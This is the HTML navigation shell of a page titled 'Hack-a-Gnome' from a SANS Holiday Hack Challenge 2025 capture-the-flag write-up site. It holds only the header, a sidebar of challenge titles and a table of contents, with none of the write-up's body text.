
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Write-Up for SANS Holiday Hack Challenge 2025">
      
      
        <meta name="author" content="Ashish Gupta">
      
      
      
        <link rel="prev" href="../Gnome_Tea/">
      
      
        <link rel="next" href="../Snowcat-RCE-%26-Priv-Esc/">
      
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
    
    
      
        <title>Hack-a-Gnome - SANS Holiday Hack Challenge 2025 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#hack-a-gnome" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2025 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Hack-a-Gnome
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224-32c7 0 13.7 3.1 18.3 8.5l136 160c6.1 7.1 7.4 17.1 3.5 25.6S369.4 176 360 176h-24.9l75.2 88.5c6.1 7.1 7.4 17.1 3.5 25.6S401.4 304 392 304h-38.5l88.8 104.5c6.1 7.1 7.4 17.1 3.5 25.6S433.4 448 424 448H256v64c0 17.7-14.3 32-32 32s-32-14.3-32-32v-64H24c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6L94.5 304H56c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l75.2-88.5H88c-9.4 0-17.9-5.4-21.8-13.9s-2.6-18.5 3.5-25.6l136-160C210.3-28.9 217-32 224-32"/></svg>

    </a>
    SANS Holiday Hack Challenge 2025 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Objectives
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Objectives
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Act 1
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Act 1
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../orientation/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Holiday Hack Orientation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Its_All_About_Defang/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Its All About Defang
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Neighborhood_Watch_Bypass/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Neighborhood Watch Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Santa_Gift-Tracking_Service_Port_Mystery/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Santa Gift-Tracking Service Port Mystery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Visual_Networking_Thinger/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Visual Networking Thinger
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Visual_Firewall_Thinger/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Visual Firewall Thinger
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Intro_to_Nmap/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Intro to Nmap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Blob_Storage_Challenge_in_the_Neighborhood/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Blob Storage Challenge in the Neighborhood
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Spare_Key/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Spare Key
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../The_Open_Door/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    The Open Door
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Owner/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Owner
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Act 2
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Act 2
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Retro_Recovery/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Retro Recovery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Mail_Detective/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Mail Detective
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../IDORable_Bistro/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    IDORable Bistro
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Dosis_Network_Down/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Dosis Network Down
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Rogue_Gnome_Identity_Provider/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Rogue Gnome Identity Provider
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Quantgnome_Leap/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Quantgnome Leap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Going_in_Reverse/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Going in Reverse
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Act 3
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Act 3
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Gnome_Tea/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Gnome Tea
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Hack-a-Gnome
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Hack-a-Gnome
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      Hints
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#objective" class="md-nav__link">
    <span class="md-ellipsis">
      Objective
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#high-level-steps" class="md-nav__link">
    <span class="md-ellipsis">
      High-Level Steps
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      Solution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#response" class="md-nav__link">
    <span class="md-ellipsis">
      Response
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#learnings" class="md-nav__link">
    <span class="md-ellipsis">
      Learnings
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#prevention-hardening-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Prevention &amp; Hardening Notes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Snowcat-RCE-%26-Priv-Esc/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Snowcat RCE & Priv-Esc
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Schrodingers_Scope/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Schrodingers Scope
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Find-and-Shutdown-Frostys-Snowglobe-Machine/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Find and Shutdown Frostys Snowglobe Machine
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../On-the-Wire/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    On the Wire
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Free_Ski/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Free Ski
    
  </span>
  

      </a>
    </li>
  

              
            
